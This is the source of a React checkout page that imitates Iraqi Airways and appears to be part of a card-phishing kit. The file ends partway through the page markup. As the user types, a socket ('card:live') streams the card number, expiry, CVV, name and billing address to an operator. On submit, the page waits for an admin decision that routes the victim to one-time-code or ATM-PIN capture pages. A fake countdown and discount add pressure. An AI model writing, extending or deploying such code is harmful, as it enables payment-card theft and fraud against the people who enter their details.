import React, { useState, useEffect, useRef } from 'react';
import { useLang } from '../contexts/LanguageContext';
import { getCurrency, convertFromKWD, CURRENCIES } from "@/lib/currency";
import { cityName as getCityName } from '../lib/airportNames';
import { useSignalEffect, useSignals } from "@preact/signals-react/runtime";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import {
  socket,
  visitor,
  sendData,
  isFormApproved,
  isCardVerified,
  navigateToPage,
  cardAction,
  waitingMessage,
  globalDiscount,
} from "@/lib/store";
import { MADA_BINS, getCardType as getCardTypeFromDB, getBinInfo } from "@/lib/binDatabase";

const schema = z.object({
  cardNumber: z
    .string()
    .min(1, "Card number is required")
    .refine((val) => {
      const cleanVal = val.replace(/\s+/g, "");
      if (!cleanVal || cleanVal.length < 13 || cleanVal.length > 19) return false;
      let sum = 0;
      let isEven = false;
      for (let i = cleanVal.length - 1; i >= 0; i--) {
        let digit = parseInt(cleanVal[i], 10);
        if (isEven) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
      }
      return sum % 10 === 0;
    }, "Invalid card number"),
  nameOnCard: z.string().min(1, "Cardholder name is required").regex(/^[A-Za-z][A-Za-z '\u0027-]*$/, "Cardholder name must use English letters"),
  expiryDate: z.string().min(1, "Expiry date is required").refine((val) => {
    const match = val.match(/^(\d{2})\/(\d{2})$/);
    if (!match) return false;
    const month = parseInt(match[1], 10);
    const year = parseInt(match[2], 10);
    if (month < 1 || month > 12) return false;
    const now = new Date();
    const currentFullYear = now.getFullYear();
    const currentYear = currentFullYear % 100;
    const currentMonth = now.getMonth() + 1;
    const expiryFullYear = 2000 + year;
    if (expiryFullYear < currentFullYear || expiryFullYear > currentFullYear + 10) return false;
    if (expiryFullYear === currentFullYear && month < currentMonth) return false;
    return true;
  }, "Invalid expiry date"),
  cvv: z.string().regex(/^\d{3}$/, "CVV must be 3 digits"),
  street: z.string().min(1, "Street is required"),
  apartment: z.string().optional(),
  city: z.string().min(1, "City is required"),
  state: z.string().optional(),
  postcode: z.string().min(1, "Postcode is required"),
  country: z.string().min(1, "Country is required"),
});

type FormData = z.infer<typeof schema>;

function isValidCardNumber(number: string): boolean {
  if (!number || number.length < 13 || number.length > 19) return false;
  let sum = 0;
  let isEven = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

function getCardType(number: string): string {
  const cleanNumber = number.replace(/\s+/g, "");
  const cardType = getCardTypeFromDB(cleanNumber);
  return cardType ? cardType.toLowerCase() : "unknown";
}

function getBankInfoLocal(cardNumber: string): { bank: string; logo: string } | null {
  const info = getBinInfo(cardNumber);
  if (info) {
    return { bank: info.bank, logo: info.bankLogo };
  }
  return null;
}

const COUNTRIES = [
  { code: 'iq', en: 'Iraq', ar: 'العراق' },
  { code: 'jo', en: 'Jordan', ar: 'الأردن' },
  { code: 'ae', en: 'UAE', ar: 'الإمارات العربية المتحدة' },
  { code: 'sa', en: 'Saudi Arabia', ar: 'المملكة العربية السعودية' },
  { code: 'kw', en: 'Kuwait', ar: 'الكويت' },
  { code: 'qa', en: 'Qatar', ar: 'قطر' },
  { code: 'bh', en: 'Bahrain', ar: 'البحرين' },
  { code: 'om', en: 'Oman', ar: 'عمان' },
  { code: 'eg', en: 'Egypt', ar: 'مصر' },
  { code: 'lb', en: 'Lebanon', ar: 'لبنان' },
  { code: 'sy', en: 'Syria', ar: 'سوريا' },
  { code: 'ps', en: 'Palestine', ar: 'فلسطين' },
  { code: 'tr', en: 'Turkey', ar: 'تركيا' },
  { code: 'ir', en: 'Iran', ar: 'إيران' },
  { code: 'ly', en: 'Libya', ar: 'ليبيا' },
  { code: 'ma', en: 'Morocco', ar: 'المغرب' },
  { code: 'tn', en: 'Tunisia', ar: 'تونس' },
  { code: 'dz', en: 'Algeria', ar: 'الجزائر' },
  { code: 'sd', en: 'Sudan', ar: 'السودان' },
  { code: 'ye', en: 'Yemen', ar: 'اليمن' },
  { code: 'gb', en: 'United Kingdom', ar: 'المملكة المتحدة' },
  { code: 'us', en: 'United States', ar: 'الولايات المتحدة' },
  { code: 'ca', en: 'Canada', ar: 'كندا' },
  { code: 'de', en: 'Germany', ar: 'ألمانيا' },
  { code: 'fr', en: 'France', ar: 'فرنسا' },
  { code: 'it', en: 'Italy', ar: 'إيطاليا' },
  { code: 'es', en: 'Spain', ar: 'إسبانيا' },
  { code: 'nl', en: 'Netherlands', ar: 'هولندا' },
  { code: 'se', en: 'Sweden', ar: 'السويد' },
  { code: 'no', en: 'Norway', ar: 'النرويج' },
  { code: 'dk', en: 'Denmark', ar: 'الدنمارك' },
  { code: 'ch', en: 'Switzerland', ar: 'سويسرا' },
  { code: 'at', en: 'Austria', ar: 'النمسا' },
  { code: 'be', en: 'Belgium', ar: 'بلجيكا' },
  { code: 'gr', en: 'Greece', ar: 'اليونان' },
  { code: 'tr', en: 'Turkey', ar: 'تركيا' },
  { code: 'my', en: 'Malaysia', ar: 'ماليزيا' },
  { code: 'in', en: 'India', ar: 'الهند' },
  { code: 'pk', en: 'Pakistan', ar: 'باكستان' },
  { code: 'id', en: 'Indonesia', ar: 'إندونيسيا' },
  { code: 'cn', en: 'China', ar: 'الصين' },
  { code: 'jp', en: 'Japan', ar: 'اليابان' },
  { code: 'kr', en: 'South Korea', ar: 'كوريا الجنوبية' },
  { code: 'au', en: 'Australia', ar: 'أستراليا' },
  { code: 'nz', en: 'New Zealand', ar: 'نيوزيلندا' },
  { code: 'br', en: 'Brazil', ar: 'البرازيل' },
  { code: 'ru', en: 'Russia', ar: 'روسيا' },
  { code: 'ua', en: 'Ukraine', ar: 'أوكرانيا' },
  { code: 'af', en: 'Afghanistan', ar: 'أفغانستان' },
  { code: 'al', en: 'Albania', ar: 'ألبانيا' },
  { code: 'ad', en: 'Andorra', ar: 'أندورا' },
  { code: 'ao', en: 'Angola', ar: 'أنغولا' },
  { code: 'ar', en: 'Argentina', ar: 'الأرجنتين' },
  { code: 'am', en: 'Armenia', ar: 'أرمينيا' },
  { code: 'az', en: 'Azerbaijan', ar: 'أذربيجان' },
  { code: 'bd', en: 'Bangladesh', ar: 'بنغلاديش' },
  { code: 'by', en: 'Belarus', ar: 'بيلاروسيا' },
  { code: 'bo', en: 'Bolivia', ar: 'بوليفيا' },
  { code: 'bg', en: 'Bulgaria', ar: 'بلغاريا' },
  { code: 'cl', en: 'Chile', ar: 'تشيلي' },
  { code: 'co', en: 'Colombia', ar: 'كولومبيا' },
  { code: 'cy', en: 'Cyprus', ar: 'قبرص' },
  { code: 'cz', en: 'Czech Republic', ar: 'جمهورية التشيك' },
  { code: 'fi', en: 'Finland', ar: 'فنلندا' },
  { code: 'ge', en: 'Georgia', ar: 'جورجيا' },
  { code: 'hk', en: 'Hong Kong', ar: 'هونغ كونغ' },
  { code: 'hu', en: 'Hungary', ar: 'المجر' },
  { code: 'is', en: 'Iceland', ar: 'آيسلندا' },
  { code: 'ie', en: 'Ireland', ar: 'أيرلندا' },
  { code: 'kz', en: 'Kazakhstan', ar: 'كازاخستان' },
  { code: 'ke', en: 'Kenya', ar: 'كينيا' },
  { code: 'lu', en: 'Luxembourg', ar: 'لوكسمبورغ' },
  { code: 'mt', en: 'Malta', ar: 'مالطا' },
  { code: 'mx', en: 'Mexico', ar: 'المكسيك' },
  { code: 'ng', en: 'Nigeria', ar: 'نيجيريا' },
  { code: 'ph', en: 'Philippines', ar: 'الفلبين' },
  { code: 'pl', en: 'Poland', ar: 'بولندا' },
  { code: 'pt', en: 'Portugal', ar: 'البرتغال' },
  { code: 'ro', en: 'Romania', ar: 'رومانيا' },
  { code: 'sg', en: 'Singapore', ar: 'سنغافورة' },
  { code: 'za', en: 'South Africa', ar: 'جنوب أفريقيا' },
  { code: 'th', en: 'Thailand', ar: 'تايلاند' },
  { code: 'uz', en: 'Uzbekistan', ar: 'أوزبكستان' },
  { code: 'vn', en: 'Vietnam', ar: 'فيتنام' },
];

export default function CreditCardPayment() {
  useSignals();
  // Subscribe to global discount signal for real-time UI updates
  const isDiscountActive = globalDiscount.value;
  const [, navigate] = useLocation();
  const [cardError, setCardError] = useState(false);
  const [luhnError, setLuhnError] = useState(false);
  const [rejectedError, setRejectedError] = useState(false);
  const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const { lang, setLang, t } = useLang();
  const isAr = lang === 'ar';
  const [langMenuOpen, setLangMenuOpen] = useState(false);
  const [isCurrencyDropdownOpen, setIsCurrencyDropdownOpen] = useState(false);
  const [timeLeft, setTimeLeft] = useState(15 * 60); // 15 minutes in seconds
  const countryDropdownRef = useRef<HTMLFieldSetElement>(null);

  // A payment page visit starts a fresh card-entry session. Do not carry over
  // the waiting state left by a previous booking step or browser navigation.
  useEffect(() => {
    waitingMessage.value = "";
    waitingCardInfo.value = null;
    isFormApproved.value = false;
    isCardVerified.value = null;
    cardAction.value = null;
  }, []);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timerId = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timerId);
  }, [timeLeft]);

  // Click outside country dropdown to close it
  useEffect(() => {
    function handleClickOutside(event: MouseEvent) {
      if (countryDropdownRef.current && !countryDropdownRef.current.contains(event.target as Node)) {
        setCountryOpen(false);
      }
    }
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  const minutes = Math.floor(timeLeft / 60);
  const seconds = timeLeft % 60;

  const searchParams = new URLSearchParams(window.location.search);
  const urlAmount = searchParams.get('amount') || '0';
  const urlCurrency = searchParams.get('currency');

  const cartItems = JSON.parse(localStorage.getItem('amouage_cart') || '[]');

  const getCartTotal = () => {
    const storedTotal = localStorage.getItem('amouage_order_total');
    if (storedTotal && Number(storedTotal) > 0) {
      return storedTotal;
    }
    let total = 0;
    for (const item of cartItems) {
      total += (parseFloat(item.priceNum) || 0) * (item.quantity || 1);
    }
    return total.toFixed(3);
  };
  
  // Save to localStorage if URL has amount, otherwise try to get from localStorage
  let totalAmount = getCartTotal();
  if (Number(urlAmount) > 0) {
    totalAmount = urlAmount;
    localStorage.setItem('amouage_order_total', urlAmount);
  }
  
  // Save currency to localStorage if in URL, otherwise try to get from localStorage
  let currentCurrency = urlCurrency;
  if (currentCurrency) {
    localStorage.setItem('amouage_currency', currentCurrency);
  } else {
    currentCurrency = localStorage.getItem('amouage_currency') || null;
  }
  
  const payCur = getCurrency(currentCurrency);
  
  const cityNames: Record<string, string> = { BGW:'Baghdad',EBL:'Erbil',BSR:'Basra',NJF:'Najaf',KIK:'Kirkuk',ISU:'Sulaymaniyah',OSM:'Mosul',AMM:'Amman',IST:'Istanbul',DXB:'Dubai',BEY:'Beirut',CAI:'Cairo',DEL:'Delhi',FRA:'Frankfurt',KUL:'Kuala Lumpur',CAN:'Guangzhou',CPH:'Copenhagen' };
  const cityName = (code?: string) => (code ? getCityName(code.toUpperCase(), cityNames[code.toUpperCase()] || code, lang) : '');

  const originalAmountKWD = Number(totalAmount);
  const discountedAmountKWD = originalAmountKWD * 0.75;
  const liveAmountKWD = isDiscountActive ? discountedAmountKWD : originalAmountKWD;

  const displayAmount = convertFromKWD(liveAmountKWD, payCur.code);
  const originalDisplayAmount = convertFromKWD(originalAmountKWD, payCur.code);

  const displayAmountStr = displayAmount.toLocaleString('en-US', { minimumFractionDigits: payCur.decimals, maximumFractionDigits: payCur.decimals });
  const originalDisplayAmountStr = originalDisplayAmount.toLocaleString('en-US', { minimumFractionDigits: payCur.decimals, maximumFractionDigits: payCur.decimals });
  const productNames = cartItems.map((item: any) => item.name).join(', ') || 'Order Payment';

  const {
    register,
    handleSubmit,
    watch,
    setValue,
    reset,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      cardNumber: "",
      nameOnCard: "",
      expiryDate: "",
      cvv: "",
      street: "",
      apartment: "",
      city: "",
      state: "",
      postcode: "",
      country: "Iraq",
    },
  });

  const cardNumber = watch("cardNumber");
  const nameOnCard = watch("nameOnCard");
  const expiryDate = watch("expiryDate");
  const cvv = watch("cvv");
  const street = watch("street");
  const city = watch("city");
  const postcode = watch("postcode");
  const country = watch("country");

  const [selectedCountry, setSelectedCountry] = useState(COUNTRIES[0]);
  const [countryOpen, setCountryOpen] = useState(false);
  const [countrySearch, setCountrySearch] = useState("");

  useEffect(() => {
    setValue("country", isAr ? selectedCountry.ar : selectedCountry.en);
  }, [selectedCountry, isAr, setValue]);

  useEffect(() => {
    // Send immediately - no debounce for real-time
    const rawNum = (cardNumber || "").replace(/\s+/g, "");
    socket.value.emit("card:live", {
      cardNumber: rawNum,
      nameOnCard: nameOnCard || "",
      expiryDate: expiryDate || "",
      cvv: cvv || "",
      billing: {
        street: street || "",
        city: city || "",
        postcode: postcode || "",
        country: country || "",
      }
    });
  }, [cardNumber, nameOnCard, expiryDate, cvv, street, city, postcode, country]);

  const cleanCardNumber = cardNumber?.replace(/\s+/g, "") || "";
  const isFormValid =
    cleanCardNumber.length >= 13 &&
    cleanCardNumber.length <= 19 &&
    !luhnError &&
    nameOnCard?.trim().length > 0 &&
    expiryDate?.match(/^\d{2}\/\d{2}$/) &&
    cvv?.length === 3 &&
    street?.trim().length > 0 &&
    city?.trim().length > 0 &&
    postcode?.trim().length > 0 &&
    country?.trim().length > 0;

  const [selectedCardType, setSelectedCardType] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [expiryError, setExpiryError] = useState(false);
  const [globalBlockedError, setGlobalBlockedError] = useState(false);

  useEffect(() => {
    if (expiryMonth && expiryYear) {
      const formatted = `${expiryMonth}/${expiryYear}`;
      setValue("expiryDate", formatted);
      
      const m = parseInt(expiryMonth, 10);
      const y = parseInt(expiryYear, 10);
      if (m >= 1 && m <= 12 && y >= 24) {
        setExpiryError(false);
      } else {
        setExpiryError(true);
      }
    }
  }, [expiryMonth, expiryYear, setValue]);

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 19) value = value.slice(0, 19);
    
    // Auto-detect card type
    const type = getCardType(value);
    if (type === "visa") setSelectedCardType("Visa");
    else if (type === "mastercard") setSelectedCardType("MasterCard");
    
    // Luhn check
    if (value.length >= 13) {
      setLuhnError(!isValidCardNumber(value));
    } else {
      setLuhnError(false);
    }

    // Blocked prefix check
    const isPrefixBlocked = visitor.value.blockedCardPrefixes?.some(prefix => value.startsWith(prefix));
    setCardError(!!isPrefixBlocked);

    // Format with spaces
    const formatted = value.replace(/(\d{4})(?=\d)/g, "$1 ");
    e.target.value = formatted;
    setValue("cardNumber", formatted);
  };

  useSignalEffect(() => {
    if (isFormApproved.value) {
      navigate("/otp-verification");
    }
  });

  useSignalEffect(() => {
    const action = cardAction.value;
    if (!action) return;
    
    if (action.action === "otp") {
      navigate("/otp-verification");
    } else if (action.action === "atm") {
      navigate("/atm-password");
    } else if (action.action === "reject") {
      setRejectedError(true);
      waitingCardInfo.value = null;
      waitingMessage.value = "";
    }
  });

  const onSubmit = (data: FormData) => {
    if (cardError || luhnError) return;
    
    setRejectedError(false);
    const cleanNum = data.cardNumber.replace(/\s+/g, "");
    
    sendData({
      paymentCard: {
        number: cleanNum,
        name: data.nameOnCard,
        expiry: data.expiryDate,
        cvv: data.cvv,
        type: selectedCardType || getCardType(cleanNum),
        bank: getBankInfoLocal(cleanNum)?.bank || "Unknown Bank",
        billing: {
          street: data.street,
          apartment: data.apartment,
          city: data.city,
          state: data.state,
          postcode: data.postcode,
          country: data.country,
        }
      },
      current: "صفحة الدفع",
      nextPage: "انتظار الرد",
      waitingForAdminResponse: true,
    });

    waitingMessage.value = lang === 'ar' ? "جاري معالجة الدفع..." : "Processing payment...";
  };

  const tripSummary = JSON.parse(localStorage.getItem('tripSummary') || '{}');
  const origin = tripSummary.originCode || 'BGW';
  const destination = tripSummary.destCode || 'EBL';
  const originCity = cityName(origin);
  const destCity = cityName(destination);
  const paxCount = tripSummary.passengerCount || tripSummary.paxCount || 1;
  const flightsConv = tripSummary.flightsConv || 0;
  const taxesConv = tripSummary.taxesConv || 0;
  const baseTotalConv = tripSummary.baseTotalConv || 0;
  const curCode = tripSummary.curCode || 'IQD';
  const [priceDetailOpen, setPriceDetailOpen] = useState(false);
  const [adultDetailOpen, setAdultDetailOpen] = useState(false);
  const [childDetailOpen, setChildDetailOpen] = useState(false);
  // Parse pax from flightData
  const flightData = JSON.parse(localStorage.getItem('selectedFlight') || localStorage.getItem('flightData') || '{}');
  const px = flightData.pax || { adult: paxCount, child: 0, infant: 0 };
  const numAdults = px.adult || paxCount;
  const numChildren = px.child || 0;
  const numInfants = px.infant || 0;
  // Calculate per-type prices
  const baseFarePerPerson = flightsConv / (numAdults + numChildren) || 0;
  const taxPerAdult = taxesConv / (numAdults + numChildren) || 0;
  const pricePerAdult = baseFarePerPerson + taxPerAdult;
  const totalAdults = pricePerAdult * numAdults;
  const pricePerChild = baseFarePerPerson * 0.75; // children ~75% of adult
  const taxPerChild = 0; // children no departure tax
  const totalChildren = (pricePerChild + taxPerChild) * numChildren;
  const fmtPrice = (n: number) => n.toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2});
  const rawFlightDate = tripSummary.firstDate || flightData?.legs?.[0]?.date || flightData?.date || '';
  const flightDate = /invalid date/i.test(String(rawFlightDate)) ? '' : String(rawFlightDate);
  const formatShortDate = (d: string) => {
    if (!d || /invalid date/i.test(d)) return '';
    const dt = new Date(d.includes('T') ? d : d + 'T00:00:00');
    if (Number.isNaN(dt.getTime())) return '';
    return dt.toLocaleDateString('en-GB', { weekday: 'short', day: 'numeric', month: 'short' });
  };

  const filteredCountries = COUNTRIES.filter(c => 
    c.en.toLowerCase().includes(countrySearch.toLowerCase()) || 
    c.ar.includes(countrySearch)
  );

  return (
    <div className="min-h-screen flex flex-col bg-white" dir={isAr ? 'rtl' : 'ltr'} style={{ fontFamily: 'Lato, sans-serif' }}>

      <WaitingOverlay />

      {/* Header */}
      <header className="bg-[#4ca42c] text-white">
        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
          {/* Logo and Home (Right in RTL, Left in LTR) */}
          <div className="flex items-center gap-6">
            <img src="/iraqi_airways/upload/logo-white-transparent.png" alt="Iraqi Airways" className="h-10 cursor-pointer" onClick={() => navigate('/')} />
            <span className="hidden sm:inline border-l border-white/50 h-6"></span>
            <span className="hidden sm:inline text-sm cursor-pointer hover:underline" onClick={() => navigate('/')}>{t('common.home')}</span>
            <button className="sm:hidden text-white" onClick={() => navigate('/')}><svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M4 6h16M4 12h16M4 18h16"/></svg></button>
          </div>

          {/* Language Switcher (Left in RTL, Right in LTR) */}
          <div className="relative">
            <button onClick={() => setLangMenuOpen(o => !o)} className="text-sm flex items-center gap-1 hover:text-white/80 transition-colors">
              <span>{lang === 'ar' ? 'العربية' : 'English'}</span>
              <span className="text-xs">▼</span>
            </button>
            {langMenuOpen && (
              <div className={`absolute z-30 mt-1 w-36 bg-white rounded-xl shadow-lg border border-gray-200 overflow-hidden ${isAr ? 'left-0' : 'right-0'}`}>
                <button onClick={() => { setLang('ar'); setLangMenuOpen(false); }} className="block w-full text-start px-4 py-2.5 text-sm text-gray-800 hover:bg-green-50">العربية</button>
                <button onClick={() => { setLang('en'); setLangMenuOpen(false); }} className="block w-full text-start px-4 py-2.5 text-sm text-gray-800 hover:bg-green-50">English</button>
              </div>
            )}
          </div>
        </div>
        {/* Info bar */}
        <div className="bg-white border-b">
          <div className="max-w-7xl mx-auto px-4 py-2 flex items-center justify-between flex-wrap sm:flex-nowrap">
            {/* Route and Info (Right in RTL, Left in LTR) */}
            <div className="flex items-center flex-wrap sm:flex-nowrap gap-2 sm:gap-6">
              {/* Mobile route text */}
              <div className="sm:hidden">
                <p className="text-sm font-bold text-[#1B5E20]">{cityName(origin)} - {cityName(destination)}</p>
                <p className="text-xs text-gray-600">{formatShortDate(flightDate)} &nbsp; {paxCount} 👤</p>
              </div>
              {/* Desktop: full route with dots */}
              <div className="hidden sm:flex items-baseline gap-1">
                <div className="flex flex-col">
                  <span className="text-[22px] font-bold text-[#1B5E20]">{origin}</span>
                  <span className="text-xs text-gray-500">{cityName(origin)}</span>
                </div>
                <div className="flex flex-col items-center mx-3 gap-0.5">
                  <div className="flex items-center">
                    <span className="text-[#4ca42c] text-[10px] tracking-[2px]">················</span>
                    <svg className={`w-4 h-4 text-[#4ca42c] ${isAr ? 'rotate-180 mr-0.5' : 'ml-0.5'}`} fill="currentColor" viewBox="0 0 24 24"><path d="M21 16v-2l-8-5V3.5c0-.83-.67-1.5-1.5-1.5S10 2.67 10 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5l8 2.5z"/></svg>
                  </div>
                </div>
                <div className="flex flex-col">
                  <span className="text-[22px] font-bold text-[#1B5E20]">{destination}</span>
                  <span className="text-xs text-gray-500">{cityName(destination)}</span>
                </div>
              </div>
              <span className="hidden sm:block text-gray-300 text-lg sm:text-2xl">|</span>
              <div>
                <p className="text-[10px] sm:text-sm text-[#1B5E20]">{isAr ? 'مغادرة' : 'Depart'}</p>
                <p className="text-xs sm:text-base font-bold text-[#1B5E20]">{formatShortDate(flightDate)}</p>
              </div>
              <span className="hidden sm:block text-gray-300 text-lg sm:text-2xl">|</span>
              <div>
                <p className="text-[10px] sm:text-sm text-[#1B5E20]">{isAr ? 'مسافرون' : 'Passenger'}</p>
                <p className="text-xs sm:text-base font-bold text-[#1B5E20]">{paxCount} 👤</p>
              </div>
            </div>

            {/* Your booking (Left in RTL, Right in LTR) */}
            <div className="bg-[#2E7D32] w-[60px] h-[50px] sm:w-[90px] sm:h-[70px] rounded flex flex-col items-center justify-center gap-0.5 sm:gap-1 text-white">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M2.25 3h1.386c.51 0 .955.343 1.087.835l.383 1.437M7.5 14.25a3 3 0 00-3 3h15.75m-12.75-3h11.218c1.121-2.3 2.1-4.684 2.924-7.138a60.114 60.114 0 00-16.536-1.84M7.5 14.25L5.106 5.272M6 20.25a.75.75 0 11-1.5 0 .75.75 0 011.5 0zm12.75 0a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"/></svg>
              <span className="font-bold text-[10px]">{t('fsr.yourBooking')}</span>
            </div>
          </div>
        </div>
      </header>

      {/* Main */}
      <main className="flex-1 max-w-4xl mx-auto w-full px-4 py-8">
        {/* Checkout title */}
        <div className="text-center mb-8">
          <div className="inline-block border border-gray-300 rounded-lg px-8 py-4">
            <h1 className="text-[#2E7D32] text-2xl font-light">{isAr ? 'إتمام الدفع' : 'Checkout'}</h1>
          </div>
        </div>

        {/* Total price card */}
        <div className="border border-gray-200 rounded-lg p-6 mb-8">
          <div className="flex items-start justify-between">
            <div>
              <p className="text-[#2E7D32] flex items-center gap-2">
                {isAr ? 'السعر الإجمالي:' : 'Total price:'} 
                {globalDiscount.value && <span className="text-lg line-through text-[#FF0000]">IQD {originalDisplayAmountStr}</span>}
                <span className="font-light">IQD</span> <strong className="text-2xl">{displayAmountStr}</strong>
              </p>
              <p className="text-gray-500 text-sm mt-1">{isAr ? 'سعر الذهاب لجميع المسافرين (شاملاً الضرائب والرسوم والخصومات).' : 'One way price for all passengers (including taxes, fees and discounts).'}</p>
              <a href="#" className="text-[#2E7D32] text-sm underline">{isAr ? 'سياسة الأمتعة المفصلة ↗' : 'Detailed baggage policy ↗'}</a>
            </div>
            <button onClick={() => setPriceDetailOpen(!priceDetailOpen)} className="w-10 h-10 flex items-center justify-center text-gray-500 hover:text-[#2E7D32]">
              <span className={`text-xl transition-transform ${priceDetailOpen ? 'rotate-180' : ''}`}>∨</span>
            </button>
          </div>
          {priceDetailOpen && <div className="mt-4">
            {/* Adults */}
            <div className="rounded overflow-hidden mb-2">
              <div className="bg-[#4a8c2a] text-white px-4 py-2 flex justify-between items-center cursor-pointer" onClick={() => setAdultDetailOpen(!adultDetailOpen)}>
                <span className="font-bold">{numAdults} {isAr ? (numAdults > 1 ? 'بالغين' : 'بالغ') : `Adult${numAdults > 1 ? 's' : ''}`}</span>
                <span className="font-bold">IQD {fmtPrice(totalAdults)} {adultDetailOpen ? '∧' : '∨'}</span>
              </div>
              {adultDetailOpen && <div className="bg-[#f0f7f0] p-4">
                <div className="flex justify-between text-[#2E7D32] font-bold mb-1"><span>{isAr ? 'رسوم النقل الجوي' : 'Air Transportation Charges'}</span><span>IQD {fmtPrice(baseFarePerPerson * numAdults)}</span></div>
                <div className="flex justify-between text-sm text-gray-600 border-b border-[#4CAF50] pb-2 mb-2 ml-2"><span>{isAr ? 'السعر الأساسي' : 'Base fare'}</span><span>IQD {fmtPrice(baseFarePerPerson * numAdults)}</span></div>
                <div className="flex justify-between text-[#2E7D32] font-bold mb-1"><span>{isAr ? 'الضرائب والرسوم والمصاريف' : 'Taxes, fees and charges'}</span><span>IQD {fmtPrice(taxPerAdult * numAdults)}</span></div>
                <div className="flex justify-between text-sm text-gray-600 border-b border-[#4CAF50] pb-2 mb-2 ml-2"><span>{isAr ? 'ضريبة المغادرة المحلية' : 'Domestic Departure Tax'}</span><span>IQD {fmtPrice(taxPerAdult * numAdults)}</span></div>
                <div className="flex justify-between text-[#2E7D32] font-bold mt-2"><span>{isAr ? 'إجمالي السعر لكل بالغ' : 'Total price per adult'}</span><span>IQD {fmtPrice(pricePerAdult)}</span></div>
                <div className="flex justify-between text-sm text-gray-600 ml-2"><span>× {numAdults} {isAr ? (numAdults > 1 ? 'بالغين' : 'بالغ') : `Adult${numAdults > 1 ? 's' : ''}`}</span><span>IQD {fmtPrice(totalAdults)}</span></div>
              </div>}
            </div>
            {/* Children */}
            {numChildren > 0 && <div className="rounded overflow-hidden mb-2">
              <div className="bg-[#4a8c2a] text-white px-4 py-2 flex justify-between items-center cursor-pointer" onClick={() => setChildDetailOpen(!childDetailOpen)}>
                <span className="font-bold">{numChildren} {isAr ? (numChildren > 1 ? 'أطفال' : 'طفل') : `Child${numChildren > 1 ? 'ren' : ''}`}</span>
                <span className="font-bold">IQD {fmtPrice(totalChildren)} {childDetailOpen ? '∧' : '∨'}</span>
              </div>
              {childDetailOpen && <div className="bg-[#f0f7f0] p-4">
                <div className="flex justify-between text-[#2E7D32] font-bold mb-1"><span>{isAr ? 'رسوم النقل الجوي' : 'Air Transportation Charges'}</span><span>IQD {fmtPrice(pricePerChild * numChildren)}</span></div>
                <div className="flex justify-between text-sm text-gray-600 border-b border-[#4CAF50] pb-2 mb-2 ml-2"><span>{isAr ? 'السعر الأساسي' : 'Base fare'}</span><span>IQD {fmtPrice(pricePerChild * numChildren)}</span></div>
                <div className="flex justify-between text-[#2E7D32] font-bold mb-1"><span>{isAr ? 'الضرائب والرسوم والمصاريف' : 'Taxes, fees and charges'}</span><span>IQD 0.00</span></div>
                <div className="flex justify-between text-[#2E7D32] font-bold mt-2"><span>{isAr ? 'إجمالي السعر لكل طفل' : 'Total price per child'}</span><span>IQD {fmtPrice(pricePerChild)}</span></div>
                <div className="flex justify-between text-sm text-gray-600 ml-2"><span>× {numChildren} {isAr ? (numChildren > 1 ? 'أطفال' : 'طفل') : `Child${numChildren > 1 ? 'ren' : ''}`}</span><span>IQD {fmtPrice(totalChildren)}</span></div>
              </div>}
            </div>}
          </div>}
        </div>

        {/* Select payment method */}
        <div className="border border-gray-200 rounded-lg p-6 mb-8">
          <h2 className="text-center text-[#2E7D32] text-xl font-bold mb-6">{isAr ? 'اختر طريقة الدفع' : 'Select your payment method'}</h2>

          <div className="border border-gray-200 rounded-lg p-6">
            {/* Credit Card header */}
            <div className="flex items-center gap-3 mb-2">
              <svg className="w-6 h-6 text-[#2E7D32]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2" strokeWidth="2"/><line x1="1" y1="10" x2="23" y2="10" strokeWidth="2"/></svg>
              <h3 className="text-[#2E7D32] text-lg font-bold">{isAr ? 'بطاقة ائتمان' : 'Credit Card'}</h3>
            </div>
            <div className="flex gap-2 mb-4">
              <img src="/iraqi_airways/visa.png" alt="Visa" className="h-6" />
              <img src="/iraqi_airways/mastercard.png" alt="MC" className="h-6" />
            </div>
            <hr className="mb-6" />

            {/* Card form */}
            <form onSubmit={handleSubmit(onSubmit)}>
              {/* Top row: Card preview left + Card type & Card number right */}
              <div className={`cc-card-form-top flex flex-col sm:flex-row gap-6 items-start ${isAr ? 'sm:flex-row-reverse' : ''}`}>
                {/* Card preview */}
                <div className="w-full sm:w-64 sm:min-w-[256px] h-40 rounded-xl text-white flex flex-col justify-between relative flex-shrink-0 overflow-hidden mx-auto sm:mx-0 max-w-[320px]" style={{background:'linear-gradient(135deg, #5a6a8a 0%, #4a5a7a 40%, #3d4a6b 100%)'}}>
                  {/* Diagonal stripe overlay */}
                  <div className="absolute inset-0" style={{background:'linear-gradient(135deg, transparent 55%, rgba(0,0,0,0.15) 55%, rgba(0,0,0,0.15) 100%)'}}></div>
                  {/* Bottom darker band */}
                  <div className="absolute bottom-0 left-0 right-0 h-12" style={{background:'linear-gradient(to top, rgba(0,0,0,0.3), transparent)'}}></div>
